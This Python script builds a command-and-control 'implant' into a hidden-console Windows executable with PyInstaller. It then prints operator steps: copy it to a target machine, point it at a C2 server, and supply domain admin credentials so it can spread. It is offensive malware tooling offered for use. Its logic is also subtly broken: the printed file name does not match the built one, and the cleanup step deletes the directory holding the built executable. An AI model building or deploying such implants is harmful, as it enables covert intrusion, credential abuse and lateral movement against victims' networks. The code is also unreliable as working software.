import os
import sys
import subprocess
import shutil
from datetime import datetime

def build_implant():
    """Build the implant executable using PyInstaller"""
    print("Building implant executable...")
    
    # Create build directory if it doesn't exist
    if not os.path.exists('build'):
        os.makedirs('build')
    
    # Create dist directory if it doesn't exist
    if not os.path.exists('dist'):
        os.makedirs('dist')
    
    # PyInstaller command
    pyinstaller_cmd = [
        'pyinstaller',
        '--noconfirm',
        '--onefile',
        '--windowed',  # Hide console window
        '--clean',
        '--add-data', 'implant/implant.py;.',
        '--icon', 'assets/icon.ico' if os.path.exists('assets/icon.ico') else None,
        '--name', f'implant_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
        'implant/implant.py'
    ]
    
    # Remove None values
    pyinstaller_cmd = [cmd for cmd in pyinstaller_cmd if cmd is not None]
    
    try:
        # Run PyInstaller
        subprocess.run(pyinstaller_cmd, check=True)
        
        # Move executable to build directory
        exe_name = pyinstaller_cmd[-1].split('/')[-1] + '.exe'
        shutil.move(os.path.join('dist', exe_name), os.path.join('build', exe_name))
        
        print(f"\nImplant executable built successfully: build/{exe_name}")
        print("\nTo use the implant:")
        print("1. Copy the executable to the target machine")
        print("2. Run it with the C2 server URL as an argument:")
        print(f"   {exe_name} http://your-c2-server:5000")
        print("\nOptional: Set domain credentials for spreading:")
        print("   set DOMAIN_USER=domain\\admin")
        print("   set DOMAIN_PASSWORD=password")
        
    except subprocess.CalledProcessError as e:
        print(f"Error building implant: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")
        sys.exit(1)
    finally:
        # Cleanup
        if os.path.exists('build'):
            shutil.rmtree('build')
        if os.path.exists('dist'):
            shutil.rmtree('dist')
        if os.path.exists('implant.spec'):
            os.remove('implant.spec')

if __name__ == '__main__':
    build_implant() 